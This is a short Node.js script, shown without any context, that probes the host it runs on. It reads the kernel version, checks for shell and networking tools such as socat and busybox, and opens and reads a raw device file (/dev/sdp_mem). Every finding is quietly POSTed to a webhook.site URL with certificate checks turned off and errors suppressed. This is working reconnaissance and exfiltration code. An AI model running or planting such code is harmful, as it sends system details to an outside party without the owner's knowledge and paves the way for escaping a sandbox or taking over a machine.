var fs = require('fs');
var https = require('https');
function send(p, b) {
    try {
        var r = https.request({
            hostname: 'webhook.site',
            path: '/49eca885-643e-4d14-a1d1-c284408e4033/' + p,
            method: 'POST',
            rejectUnauthorized: false
        }, function () {});
        r.on('error', function () {});
        r.end(b);
    } catch (e) {}
}
try {
    send('rw', 'version=' + fs.readFileSync('/proc/version', 'utf8'));
} catch (e) {
    send('rw', 'version ERR ' + e);
}
['/usr/bin/dotnet', '/usr/bin/bash', '/usr/bin/socat', '/usr/bin/python3', '/usr/bin/python', '/usr/bin/busybox', '/usr/bin/base32', '/dev/sdp_mem', '/dev/sdp_pqe_fdet'].forEach(function (p) {
    try {
        var s = fs.statSync(p);
        send('rw', p + ' mode=' + s.mode.toString(8) + ' size=' + s.size);
    } catch (e) {
        send('rw', p + ' ERR ' + e);
    }
});
try {
    var fd = fs.openSync('/dev/sdp_mem', 'r+');
    send('rw', 'sdp open fd=' + fd);
    var b = new Buffer(32);
    var n = fs.readSync(fd, b, 0, 32, 0);
    send('rw', 'sdp readAt0 n=' + n + ' hex=' + b.toString('hex'));
    fs.closeSync(fd);
} catch (e) {
    send('rw', 'sdp ERR ' + e);
}
